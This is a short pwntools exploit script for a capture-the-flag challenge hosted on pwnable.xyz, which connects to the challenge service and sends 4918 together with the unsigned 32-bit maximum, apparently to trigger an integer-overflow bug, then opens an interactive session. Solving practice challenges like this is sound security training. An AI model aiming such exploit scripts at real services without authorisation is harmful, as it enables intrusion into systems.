from pwn import *

#context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./challenge")
else:
    #PORT = int(input("PORT: "))
    #HOST = int(input("HOST: "))
    #p = remote("host"+str(HOST)+".dreamhack.games", PORT)
    p = remote("svc.pwnable.xyz", 30001)

elf = ELF("./challenge")


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


p.recvuntil("input: ")
UNSIGNED_INT_MAX = 4294967295
num1 = 4918
num2 = UNSIGNED_INT_MAX
p.sendline(f"{num1} {num2}")
log.success(p.recv())

p.interactive()
